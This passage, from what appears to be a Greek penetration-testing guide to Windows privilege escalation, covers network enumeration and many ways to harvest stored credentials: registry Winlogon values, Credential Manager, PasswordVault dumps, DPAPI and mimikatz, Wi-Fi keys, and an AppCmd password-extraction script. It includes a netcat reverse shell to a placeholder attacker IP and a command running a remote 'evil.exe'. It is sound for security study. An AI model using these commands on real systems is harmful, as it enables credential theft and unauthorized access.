Για έναν τοπικό listener, συσχετίστε το PID του με τον κάτοχο της διεργασίας, τη διαδρομή του εκτελέσιμου αρχείου και κάθε υπηρεσία ή προγραμματισμένη εργασία που τον εκκινεί. Μια υπηρεσία απομακρυσμένου ελέγχου μπορεί να παρέχει πρόσβαση ως ο χρήστης της επιφάνειας εργασίας του μόνο εφόσον το επιτρέπουν οι μηχανισμοί ελέγχου ταυτότητας και ελέγχου εντολών της. Μια προσαρμοσμένη εφαρμογή TCP που εκτελείται με λογαριασμό υψηλότερων προνομίων αποτελεί ξεχωριστό στόχο ελέγχου: ο listener και η διαδρομή του δυαδικού αρχείου είναι παθητικές ενδείξεις, ενώ μια αυθεντικοποιημένη διαδρομή εκμετάλλευσης καταστροφής μνήμης απαιτεί ανάλυση του συγκεκριμένου δυαδικού αρχείου και των εισόδων στις οποίες έχει πρόσβαση. Αν μια εκτεθειμένη θύρα φαίνεται να ανήκει σε διεργασία συστήματος, συγκρίνετέ την με το [`netsh interface portproxy show all`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-interface) προτού αποδώσετε την υπηρεσία backend· ένας κανόνας προώθησης από μόνος του δεν αποδεικνύει ότι ο προορισμός είναι προσβάσιμος ή ευάλωτος.

### Πίνακας δρομολόγησης

```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

### Πίνακας ARP

```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```

### Κανόνες Firewall

[**Δείτε αυτή τη σελίδα για εντολές σχετικές με το Firewall**](../basic-cmd-for-pentesters.md#firewall) **(εμφάνιση κανόνων, δημιουργία κανόνων, απενεργοποίηση, απενεργοποίηση...)**

Περισσότερες[ εντολές για network enumeration εδώ](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)

```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```

Το binary `bash.exe` μπορεί επίσης να βρεθεί στο `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`

Αν αποκτήσετε root user, μπορείτε να ακούτε σε οποιαδήποτε θύρα (την πρώτη φορά που χρησιμοποιείτε το `nc.exe` για να ακούσετε σε μια θύρα, θα εμφανιστεί ένα GUI που θα σας ρωτήσει αν το `nc` πρέπει να επιτραπεί από το firewall).

```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```

Για να ξεκινήσετε εύκολα το bash ως root, μπορείτε να δοκιμάσετε το `--default-user root`

Μπορείτε να εξερευνήσετε το σύστημα αρχείων του `WSL` στον φάκελο `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

Ο χρήστης Linux `root` μέσα στο WSL δεν αποκτά από μόνος του δικαιώματα διαχειριστή των Windows. Αν η τρέχουσα ταυτότητα Windows μπορεί να διαβάσει το σύστημα αρχείων μιας διανομής, ελέγξτε τα αρχεία ιστορικού κελύφους (συμπεριλαμβανομένου του `/root/.bash_history`) για εντολές στις οποίες ενδέχεται να έχουν καταγραφεί διαπιστευτήρια· η κλιμάκωση εξακολουθεί να απαιτεί έναν έγκυρο λογαριασμό με υψηλότερα προνόμια και μια επιτρεπόμενη διαδρομή ελέγχου ταυτότητας. Η διάταξη `LocalState\rootfs` αφορά παλαιότερες εγκαταστάσεις WSL· το WSL 2 συνήθως αποθηκεύει τη διανομή σε έναν [εικονικό δίσκο `ext4.vhdx`](https://learn.microsoft.com/en-us/windows/wsl/disk-space), επομένως εντοπίστε πρώτα την πραγματική διανομή και τη διαδρομή αποθήκευσής της. Αποφύγετε την εμφάνιση του περιεχομένου του ιστορικού κατά την αυτοματοποιημένη απαρίθμηση.

## Διαπιστευτήρια Windows

### Διαπιστευτήρια Winlogon

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

Αντιμετωπίστε τα `DefaultUserName` και `DefaultDomainName` ως στοιχεία του λογαριασμού και όχι ως διαπιστευτήρια. Μια μη κενή τιμή `DefaultPassword` ή `AltDefaultPassword` αποτελεί εύρημα plaintext στο registry. Αν το `AutoAdminLogon=1`, αλλά δεν είναι δυνατή η ανάγνωση κωδικού πρόσβασης σε plaintext, αυτό αποτελεί μόνο ένδειξη προς διερεύνηση: το [Sysinternals Autologon μπορεί να αποθηκεύσει τον κωδικό πρόσβασης ως LSA secret](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon), και οι συνήθεις αναγνώσεις του registry δεν επιβεβαιώνουν αν υπάρχει τέτοιο secret ή αν μπορεί να ανακτηθεί. Εξετάστε τα δικαιώματα πρόσβασης και την πραγματική διαμόρφωση σύνδεσης πριν αναφέρετε έκθεση διαπιστευτηρίων.

### Credential Manager / Windows Vault

Από το [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup>\
Το Windows Vault αποθηκεύει διαπιστευτήρια για servers, ιστότοπους και άλλα προγράμματα, τα οποία μπορεί να χρησιμοποιήσει το **Windows** για να **συνδέει αυτόματα τους χρήστες**. Αρχικά, μπορεί να φαίνεται ότι οι χρήστες μπορούν να αποθηκεύσουν διαπιστευτήρια για ιστότοπους όπως το Facebook, το Twitter ή το Gmail και να συνδέονται αυτόματα μέσω των browsers, αλλά αυτό δεν ισχύει.

Το Windows Vault αποθηκεύει διαπιστευτήρια με τα οποία τα Windows μπορούν να συνδέουν αυτόματα τους χρήστες. Αυτό σημαίνει ότι οποιαδήποτε **εφαρμογή Windows χρειάζεται διαπιστευτήρια για να αποκτήσει πρόσβαση σε έναν πόρο** (server ή ιστότοπο) **μπορεί να χρησιμοποιήσει αυτό το Credential Manager** και το Windows Vault, αξιοποιώντας τα παρεχόμενα διαπιστευτήρια αντί να πληκτρολογούν οι χρήστες κάθε φορά το όνομα χρήστη και τον κωδικό πρόσβασής τους.

Αν οι εφαρμογές δεν αλληλεπιδρούν με το Credential Manager, δεν νομίζω ότι μπορούν να χρησιμοποιήσουν τα διαπιστευτήρια για έναν συγκεκριμένο πόρο. Επομένως, αν η εφαρμογή σας θέλει να χρησιμοποιήσει το vault, θα πρέπει με κάποιον τρόπο να **επικοινωνήσει με το Credential Manager και να ζητήσει τα διαπιστευτήρια για αυτόν τον πόρο** από το προεπιλεγμένο vault αποθήκευσης.

Χρησιμοποιήστε το `cmdkey` για να εμφανίσετε τα αποθηκευμένα διαπιστευτήρια στον υπολογιστή.

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

Στη συνέχεια, μπορείτε να χρησιμοποιήσετε το `runas` με την επιλογή `/savecred` για να χρησιμοποιήσετε τα αποθηκευμένα διαπιστευτήρια. Το ακόλουθο παράδειγμα καλεί ένα απομακρυσμένο binary μέσω ενός SMB share.

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

Χρήση του `runas` με ένα παρεχόμενο σύνολο διαπιστευτηρίων.

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

Σημειώστε ότι μπορείτε να χρησιμοποιήσετε τα mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html) ή το [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### UWP PasswordVault / Credential Locker

Οι σύγχρονες εφαρμογές Windows UWP, το Microsoft Edge και οι σύγχρονες υπηρεσίες συστήματος αποθηκεύουν authentication tokens και plaintext passwords μέσα στο `PasswordVault` της Universal Windows Platform (UWP) (εμφανίζεται επίσης ως `Web Credentials` στο `vaultcmd`). Αυτός ο χώρος αποθήκευσης είναι απομονωμένος ανά session και μπορεί να αποκρυπτογραφηθεί εγγενώς, χωρίς δικαιώματα διαχειριστή ή `SeDebugPrivilege`.

Εκτελέστε αυτήν την εντολή PowerShell μέσα στην ενεργή session του χρήστη για να κάνετε αμέσως dump και decrypt όλων των αποθηκευμένων usernames και plaintext passwords:

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

Το **Data Protection API (DPAPI)** παρέχει μια μέθοδο συμμετρικής κρυπτογράφησης δεδομένων και χρησιμοποιείται κυρίως στο λειτουργικό σύστημα Windows για τη συμμετρική κρυπτογράφηση ασύμμετρων ιδιωτικών κλειδιών. Αυτή η κρυπτογράφηση αξιοποιεί ένα μυστικό χρήστη ή συστήματος, το οποίο συμβάλλει σημαντικά στην εντροπία.

**Το DPAPI επιτρέπει την κρυπτογράφηση κλειδιών μέσω ενός συμμετρικού κλειδιού που προκύπτει από τα μυστικά σύνδεσης του χρήστη**. Σε περιπτώσεις κρυπτογράφησης συστήματος, χρησιμοποιεί τα μυστικά ελέγχου ταυτότητας τομέα του συστήματος.

Τα κρυπτογραφημένα κλειδιά RSA χρηστών, μέσω του DPAPI, αποθηκεύονται στον κατάλογο `%APPDATA%\Microsoft\Protect\{SID}`, όπου το `{SID}` αντιστοιχεί στο [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier) του χρήστη. **Το κλειδί DPAPI, το οποίο βρίσκεται στον ίδιο φάκελο με το κύριο κλειδί που προστατεύει τα ιδιωτικά κλειδιά του χρήστη**, αποτελείται συνήθως από 64 byte τυχαίων δεδομένων. (Σημειώστε ότι η πρόσβαση σε αυτόν τον κατάλογο είναι περιορισμένη, οπότε δεν είναι δυνατή η εμφάνιση των περιεχομένων του με την εντολή `dir` στο CMD, αν και είναι δυνατή μέσω του PowerShell.)

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::masterkey` με τα κατάλληλα ορίσματα (`/pvk` ή `/rpc`) για να το αποκρυπτογραφήσετε.

Τα **αρχεία διαπιστευτηρίων που προστατεύονται από τον κύριο κωδικό πρόσβασης** βρίσκονται συνήθως στα εξής σημεία:

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

Μπορείτε να χρησιμοποιήσετε το **mimikatz module** `dpapi::cred` με το κατάλληλο `/masterkey` για αποκρυπτογράφηση.\
Μπορείτε να **εξαγάγετε πολλά DPAPI** **masterkeys** από τη **μνήμη** με το module `sekurlsa::dpapi` (αν είστε root).


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### Διαπιστευτήρια PowerShell

Τα **διαπιστευτήρια PowerShell** χρησιμοποιούνται συχνά για **scripting** και εργασίες αυτοματοποίησης, ως ένας πρακτικός τρόπος αποθήκευσης κρυπτογραφημένων διαπιστευτηρίων. Τα διαπιστευτήρια προστατεύονται με **DPAPI**, πράγμα που συνήθως σημαίνει ότι μπορούν να αποκρυπτογραφηθούν μόνο από τον ίδιο χρήστη στον ίδιο υπολογιστή όπου δημιουργήθηκαν.

Ένα εξαγόμενο διαπιστευτήριο μπορεί να έχει οποιοδήποτε όνομα αρχείου ή διαδρομή `.xml`. Όταν ένα script ή η απογραφή αρχείων παραπέμπει σε ένα τέτοιο αρχείο, εντοπίστε τον πραγματικό κατάλογο προφίλ του λογαριασμού αντί να υποθέσετε ότι βρίσκεται στο `C:\Users`: [Τα Windows μπορούν να τοποθετήσουν τα προφίλ αλλού](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory). Το γεγονός ότι ένα αρχείο είναι αναγνώσιμο αποτελεί απλώς μια ένδειξη· η [εντολή `Export-Clixml` των Windows συνδέει ένα κρυπτογραφημένο διαπιστευτήριο με τον χρήστη και τον υπολογιστή που το εξήγαγαν](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml), ενώ κάθε λογαριασμός που ανακτάται πρέπει ξεχωριστά να έχει έγκυρα δικαιώματα στην επιδιωκόμενη υπηρεσία. Αρχικά, ελέγξτε τις διαδρομές και τις ACL, χωρίς να εμφανίζετε κρυπτογραφημένες ή απλού κειμένου τιμές κατά τη συνήθη απογραφή.

Για να **αποκρυπτογραφήσετε** διαπιστευτήρια PS από το αρχείο που τα περιέχει, μπορείτε να κάνετε τα εξής:

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### Αποθηκευμένες συνδέσεις RDP

Μπορείτε να τις βρείτε στο `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\
και στο `HKCU\Software\Microsoft\Terminal Server Client\Servers`

### Πρόσφατα εκτελεσμένες εντολές

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **Διαχειριστής διαπιστευτηρίων Απομακρυσμένης επιφάνειας εργασίας**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

Χρησιμοποιήστε το module `dpapi::rdg` του **Mimikatz** με το κατάλληλο `/masterkey` για να **αποκρυπτογραφήσετε τυχόν αρχεία .rdg**\
Μπορείτε να **εξαγάγετε πολλά DPAPI masterkeys** από τη μνήμη με το module `sekurlsa::dpapi` του Mimikatz

**Το mRemoteNG χρησιμοποιεί διαφορετικό χώρο αποθήκευσης συνδέσεων.** Εξετάστε τα αναγνώσιμα XML στο `%APPDATA%\mRemoteNG` και στους φακέλους Documents των χρηστών, συμπεριλαμβανομένων αρχείων με συνηθισμένα ονόματα όπως `config.xml`. Εντοπίστε το schema των συνδέσεων και τα κρυπτογραφημένα attributes `Password` πριν θεωρήσετε ένα αρχείο XML πιθανό στοιχείο διαπιστευτηρίων. Η αποθηκευμένη τιμή δεν είναι κωδικός DPAPI/RDCMan· η ανάκτησή της εξαρτάται από τις ρυθμίσεις κρυπτογράφησης του αρχείου και από το αν χρησιμοποιήθηκε προσαρμοσμένος master password. Αποφύγετε την εκτύπωση κρυπτογραφημένων τιμών κατά την ευρεία απαρίθμηση.

**Οι εξαγωγές προφίλ Remote Desktop Plus** μπορεί επίσης να είναι αναγνώσιμες σε καταλόγους χρηστών ή σε κοινόχρηστους φακέλους διαχείρισης. Μια εξαγωγή `profiles.xml` παλαιού τύπου περιέχει καταχωρίσεις `Data/Profile` με στοιχεία `ProfileName`, `Password` και `Secure`. Θεωρήστε ένα μη κενό στοιχείο password πιθανό στοιχείο διαπιστευτηρίων, χωρίς να το εκτυπώνετε ή να υποθέτετε ότι είναι απλό κείμενο: [οι σημειώσεις του κατασκευαστή](https://www.donkz.nl/) αναφέρουν ότι η προστασία του προφίλ μπορεί να συνδέεται με τον λογαριασμό και τον υπολογιστή που το δημιούργησαν ή να έχει ρυθμιστεί με λιγότερο αυστηρό τρόπο. Επιβεβαιώστε την προέλευση του αρχείου και τις προϋποθέσεις ανάκτησης πριν βασιστείτε σε αυτό.

### Sticky Notes

Μερικές φορές οι χρήστες αποθηκεύουν κωδικούς πρόσβασης και άλλες πληροφορίες σε εφαρμογές σημειώσεων. Η εφαρμογή Sticky Notes της Microsoft, που διανέμεται ως πακέτο, αποθηκεύει συνήθως τις σημειώσεις στη διαδρομή `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`· παλαιότερες ή διαφορετικές εφαρμογές ενδέχεται να χρησιμοποιούν άλλους χώρους αποθήκευσης στο προφίλ χρήστη, μεταξύ αυτών και το LevelDB. Εντοπίστε την εγκατεστημένη εφαρμογή και τη μορφή αποθήκευσης πριν θεωρήσετε ότι η απουσία ενός αρχείου SQLite σημαίνει πως δεν υπάρχουν σημειώσεις.

Αν το Sticky Notes χρησιμοποιεί SQLite write-ahead logging, ένα αντίγραφο μόνο του `plum.sqlite` μπορεί να μην περιλαμβάνει πρόσφατες δεσμευμένες σημειώσεις. Κρατήστε το αντίστοιχο `plum.sqlite-wal` μαζί με ένα συνεπές αντίγραφο της βάσης δεδομένων και συμπεριλάβετε το `plum.sqlite-shm` όταν είναι διαθέσιμο· ο δείκτης shared-memory μπορεί να αναδημιουργηθεί, αλλά το WAL αποτελεί μέρος της μόνιμης κατάστασης της βάσης δεδομένων. Δείτε την [τεκμηρίωση WAL του SQLite](https://www.sqlite.org/wal.html). Μια σημείωση που περιέχει όνομα λογαριασμού ή κωδικό πρόσβασης αποτελεί μόνο πιθανό στοιχείο διαπιστευτηρίων: επαληθεύστε ξεχωριστά τον λογαριασμό, τα δικαιώματα πρόσβασης και την επαναχρησιμοποίηση του κωδικού πρόσβασης. Μια κρυπτογραφημένη εγγραφή password manager απαιτεί επιπλέον το πραγματικό κλειδί αποκρυπτογράφησης και την ερμηνεία της από τη συγκεκριμένη εφαρμογή, προτού τεκμηριώσει σύνδεση με υψηλότερα προνόμια.

### AppCmd.exe

**Σημειώστε ότι για την ανάκτηση κωδικών πρόσβασης από το AppCmd.exe πρέπει να είστε Administrator και να εκτελείτε το πρόγραμμα σε επίπεδο High Integrity.**\
Το **AppCmd.exe** βρίσκεται στον κατάλογο `%systemroot%\system32\inetsrv\`.\
Αν αυτό το αρχείο υπάρχει, τότε ενδέχεται να έχουν ρυθμιστεί ορισμένα **διαπιστευτήρια** και να είναι δυνατή η **ανάκτησή** τους.

Ο κώδικας αυτός εξήχθη από το [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Ελέγξτε αν υπάρχει το `C:\Windows\CCM\SCClient.exe` .\
Οι **installers εκτελούνται με προνόμια SYSTEM**, πολλοί είναι ευάλωτοι σε **DLL Sideloading (Πληροφορίες από** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Αρχεία και Registry (διαπιστευτήρια)

### Αποθηκευμένα διαπιστευτήρια registry εργαλείων υποστήριξης

Ορισμένες παλαιότερες εγκαταστάσεις απομακρυσμένης υποστήριξης διατηρούν ονόματα τιμών σχετικών με κωδικούς πρόσβασης κάτω από σταθερά κλειδιά registry της εφαρμογής. Για παράδειγμα, το `SecurityPasswordAES` του TeamViewer προσδιόριζε έναν διαμορφωμένο στατικό κωδικό πρόσβασης συνεδρίας σε εκδόσεις πριν από την 9, σύμφωνα με την [επεξήγηση του προμηθευτή για το κλειδί registry](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988). Ένας δείκτης ονόματος τιμής αποτελεί μόνο αφορμή για έλεγχο: επαληθεύστε την εγκατεστημένη έκδοση, τα αναγνώσιμα δεδομένα της τιμής, τη μορφή και την τρέχουσα συμπεριφορά ελέγχου ταυτότητας πριν αξιολογήσετε αυτά τα διαπιστευτήρια. Η μετάβαση από έναν κωδικό πρόσβασης απομακρυσμένης υποστήριξης σε έναν λογαριασμό Windows με υψηλότερα προνόμια προϋποθέτει επίσης ότι ο κωδικός πρόσβασης επαναχρησιμοποιείται πράγματι και ότι υπάρχει εξουσιοδότηση για τον συγκεκριμένο λογαριασμό. Μην εμφανίζετε ciphertext ή ανακτημένους κωδικούς πρόσβασης σε συνήθη έξοδο απαρίθμησης.

### Κοινόχρηστα υπολογιστικά φύλλα με προστατευμένα φύλλα

Αν υπάρχει υποψία ότι ένα αναγνώσιμο κοινόχρηστο βιβλίο εργασίας περιέχει δεδομένα λογαριασμών, διακρίνετε την **κρυπτογράφηση αρχείου** από την προστασία φύλλου εργασίας ή τις κρυφές στήλες. Η [Microsoft αναφέρει](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel) ότι η προστασία φύλλου εργασίας ελέγχει την επεξεργασία και δεν αποτελεί χαρακτηριστικό ασφαλείας· από μόνη της δεν αποδεικνύει ότι τα περιεχόμενα του βιβλίου εργασίας είναι κρυπτογραφημένα. Ελέγχετε μόνο εξουσιοδοτημένα και σχετικά αρχεία και αποφεύγετε την εκτύπωση πιθανών μυστικών κατά τη γενική απαρίθμηση. Μια αναγνώσιμη διαδρομή `.xlsx`, ένα προστατευμένο φύλλο ή μια κρυφή στήλη από μόνα τους δεν αποδεικνύουν ότι υπάρχουν διαπιστευτήρια ή ότι οποιοσδήποτε λογαριασμός έχει υψηλότερα προνόμια· επαληθεύστε ξεχωριστά τα πραγματικά δεδομένα και τα τρέχοντα δικαιώματα λογαριασμού.

### Διατηρημένα patches αλλαγών σε διακομιστή CI

Ένας διακομιστής CI μπορεί να διατηρεί υποβληθείσες αλλαγές πηγαίου κώδικα στον κατάλογο δεδομένων του, ακόμη και μετά την ολοκλήρωση του build. Η [TeamCity τεκμηριώνει](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) το `system/changes` ως χώρο αποθήκευσης αλλαγών από remote-run· ο κατάλογος δεδομένων μπορεί να ρυθμιστεί και δεν βρίσκεται απαραίτητα κάτω από το `ProgramData`. Ένα αναγνώσιμο patch μπορεί να διατηρεί αναφορές που αφαιρέθηκαν ή προστέθηκαν προς ένα αρχείο διαπιστευτηρίων, ένα κλειδί κρυπτογράφησης ή ένα script που χρησιμοποιεί και τα δύο. Για παράδειγμα, μια ροή εργασίας PowerShell `ConvertTo-SecureString -Key` χρειάζεται τόσο το κλειδί AES όσο και την κρυπτογραφημένη συμβολοσειρά· η [Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) ότι το κλειδί παρέχεται ξεχωριστά. Αρχικά ελέγχετε μόνο τα προσβάσιμα ονόματα patch και, στη συνέχεια, εξετάζετε το σχετικό περιεχόμενο με εξουσιοδότηση, χωρίς να εμφανίζετε μυστικά σε συνήθη έξοδο απαρίθμησης. Μια διαδρομή patch, μια κρυπτογραφημένη τιμή ή μια αναφορά σε κλειδί από μόνα τους δεν αποδεικνύουν έγκυρα διαπιστευτήρια ή πρόσβαση με υψηλότερα προνόμια. Περιορίστε τα ACL του καταλόγου δεδομένων και αποφύγετε την υποβολή μυστικών στις αλλαγές build.

### Προσαρμοσμένη περιστροφή κωδικού πρόσβασης τοπικού διαχειριστή

Ένα ιδιοκατασκευασμένο εργαλείο περιστροφής κωδικών πρόσβασης μπορεί να αποθηκεύει έναν κρυπτογραφημένο κωδικό πρόσβασης τοπικού διαχειριστή σε μια τοπική υπηρεσία, διατηρώντας παράλληλα τα διαπιστευτήρια του datastore σε ένα αναγνώσιμο αρχείο `.env` ή δίπλα στο δυαδικό αρχείο του updater. Ελέγχετε μαζί την προγραμματισμένη εργασία, τον λογαριασμό, τα ACL ρυθμίσεων, τον listener και τα δικαιώματα του datastore του updater. Ένα datastore που είναι προσβάσιμο μόνο μέσω loopback εξακολουθεί να είναι προσβάσιμο σε έναν τοπικό χρήστη με έγκυρα διαπιστευτήρια, αλλά ο έλεγχος ταυτότητας από μόνος του δεν αποδεικνύει δικαίωμα ανάγνωσης των σχετικών εγγραφών. Αν το seed κρυπτογράφησης ή το υλικό κλειδιού είναι προσβάσιμο δίπλα στο ciphertext, ελέγξτε την ακριβή παραγωγή κλειδιού πριν εμπιστευτείτε την κρυπτογράφηση. Ένα σχήμα που παράγει ντετερμινιστικά ένα κλειδί AES από εκτεθειμένο seed χρησιμοποιώντας το Go [`math/rand`](https://pkg.go.dev/math/rand) είναι ακατάλληλο για την προστασία αυτού του κωδικού πρόσβασης· η Go τεκμηριώνει ότι αυτό το package δεν είναι κατάλληλο για τυχαιότητα που αφορά την ασφάλεια. Επιβεβαιώστε ότι κάθε ανακτημένος κωδικός πρόσβασης είναι σε ισχύ και ανήκει σε λογαριασμό της ομάδας τοπικών Administrators, προτού τον θεωρήσετε διαδρομή κλιμάκωσης προνομίων. Μια προγραμματισμένη εργασία, μια διαδρομή `.env` ή ένα κρυπτογραφημένο blob από μόνα τους δεν αποδεικνύουν καμία από αυτές τις συνθήκες. Μην εμφανίζετε κωδικούς πρόσβασης και υλικό κλειδιού σε συνήθη έξοδο απαρίθμησης.

Χρησιμοποιείτε το [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) για τη διαχείριση κωδικών πρόσβασης τοπικών διαχειριστών. Η αποθήκευσή του σε directory ή Entra και οι έλεγχοι πρόσβασης είναι διαφορετικά από ένα προσαρμοσμένο τοπικό datastore· αντίστοιχα, οι [ρόλοι Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) καθορίζουν αν ένας χρήστης datastore που έχει περάσει έλεγχο ταυτότητας μπορεί να διαβάσει ένα συγκεκριμένο index.

### Αρχεία plugin διακομιστή Java και επαναχρησιμοποίηση διαπιστευτηρίων

